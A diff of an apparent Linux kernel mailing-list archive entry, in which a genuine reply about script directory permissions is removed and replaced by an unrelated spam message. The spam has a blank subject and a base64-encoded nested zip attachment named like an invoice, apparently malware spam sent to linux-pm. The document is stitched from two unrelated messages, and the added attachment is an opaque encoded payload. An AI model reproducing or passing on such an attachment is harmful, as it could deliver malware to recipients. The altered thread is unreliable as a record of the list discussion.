@@ -1,32 +1,54 @@
-From: "Rafael J. Wysocki" <rafael@kernel.org>
-Subject: Re: [RESEND PATCH] tools/power/x86/intel_pstate_tracer: Adjust
- directory permissions
-Date: Mon, 17 Apr 2017 00:57:10 +0200
-Message-ID: <CAJZ5v0gqxj97yADB4tpxONwHtrdasZREaFqLfht9id9H+Fx1QA@mail.gmail.com>
-References: <1492355834-7793-1-git-send-email-dsmythies@telus.net>
+From: <brian@oakcrestfuneralservices.com>
+Subject: (unknown)
+Date: Sun, 16 Apr 2017 23:02:59 -0000
+Message-ID: <149238377993.21738.1130541838383172627@iconpln.net.id>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
+Content-Type: application/zip; name="BALLANCE-27309006728165-linux-pm.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-pm-owner@vger.kernel.org>
-Received: from mail-oi0-f66.google.com ([209.85.218.66]:34016 "EHLO
-        mail-oi0-f66.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S932077AbdDPW5L (ORCPT
-        <rfc822;linux-pm@vger.kernel.org>); Sun, 16 Apr 2017 18:57:11 -0400
-In-Reply-To: <1492355834-7793-1-git-send-email-dsmythies@telus.net>
+Received: from 171.96.25.223.iconpln.net.id ([223.25.96.171]:46742 "HELO
+        iconpln.net.id" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S932220AbdDPXDH (ORCPT
+        <rfc822;linux-pm@vger.kernel.org>); Sun, 16 Apr 2017 19:03:07 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: linux-pm-owner@vger.kernel.org
 List-Id: linux-pm@vger.kernel.org
-To: Doug Smythies <doug.smythies@gmail.com>
-Cc: Srinivas Pandruvada <srinivas.pandruvada@linux.intel.com>, "Rafael J. Wysocki" <rjw@rjwysocki.net>, Len Brown <len.brown@intel.com>, Doug Smythies <dsmythies@telus.net>, Linux Kernel Mailing List <linux-kernel@vger.kernel.org>, Linux PM <linux-pm@vger.kernel.org>
+To: linux-pm <linux-pm@vger.kernel.org>
 
-On Sun, Apr 16, 2017 at 5:17 PM, Doug Smythies <doug.smythies@gmail.com> wrote:
-> Depending on what is being done, the intel_pstate_tracer.py script
-> needs to be run as root, or can be run as a regular user.
-> If run the first time as root the results directory will be
-> incorrect for any subsequent run as a regular user.
-
-Which is OK.
-
-For security reasons, non-root should not be able to modify root-owned
-directories.
-
-Thanks,
-Rafael
+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
+AVBLBQYAAAAAAQABAFsAAABxBwAAAAA=
